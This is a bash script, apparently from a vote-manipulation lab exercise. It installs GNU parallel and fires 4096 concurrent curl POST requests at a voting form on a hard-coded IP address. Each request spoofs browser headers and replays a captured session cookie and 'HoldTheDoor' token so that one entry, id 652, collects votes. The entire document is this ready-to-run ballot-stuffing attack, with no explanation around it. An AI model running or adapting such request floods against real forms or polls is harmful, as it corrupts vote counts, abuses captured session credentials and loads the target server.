#!/bin/bash

sudo apt install parallel --yes

seq 4096 | parallel -n0 -j4 "curl 'http://158.69.76.135/level1.php' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://158.69.76.135' -H 'Upgrade-Insecure-Requests: 1' -H 'DNT: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: http://158.69.76.135/level1.php' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8' -H 'Cookie: PHPSESSID=lgbra6cst3brccp3m9lab0il44; HoldTheDoor=2e25c9640b426b4405ea556a5144673a4b96abe1' --data 'id=652&holdthedoor=Submit&key=2e25c9640b426b4405ea556a5144673a4b96abe1' --compressed --silent"
